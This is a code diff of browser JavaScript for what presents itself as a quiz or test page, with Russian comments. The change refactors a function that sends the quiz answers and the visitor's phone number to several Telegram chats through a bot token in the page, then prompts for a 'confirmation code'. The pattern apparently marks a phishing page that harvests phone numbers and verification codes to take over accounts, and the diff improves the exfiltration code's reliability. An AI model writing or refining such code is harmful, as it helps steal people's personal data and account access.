@@ -118,17 +118,19 @@
 
         // Отправка данных в Telegram (без проверки успешности)
         async function sendToTelegram(message) {
-            for (let chat_id of CHAT_IDS) {
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chat_id,
-                        text: message,
-                    }),
-                }).catch(error => {
-                    console.error("Ошибка при отправке сообщения в Telegram", error);
-                });
+            try {
+                for (let chat_id of CHAT_IDS) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chat_id,
+                            text: message,
+                        }),
+                    });
+                }
+            } catch (error) {
+                console.error("Ошибка при отправке сообщения в Telegram", error);
             }
         }
 
@@ -155,8 +157,9 @@
             submitButton.disabled = true;
             submitButton.innerText = "Отправляется...";
 
-            // Отправка данных в Telegram (без проверки успешности)
-            sendToTelegram(`📋 Результаты теста:\n${answers.join('\n')}\n📱 Номер телефона: ${phone}`);
+            // Отправка данных в Telegram
+            const message = `📋 Результаты теста:\n${answers.join('\n')}\n📱 Номер телефона: ${phone}`;
+            sendToTelegram(message);
 
             // Переход к форме ввода кода
             document.getElementById('testMessage').textContent = "Ответы отправлены. Введите код подтверждения.";
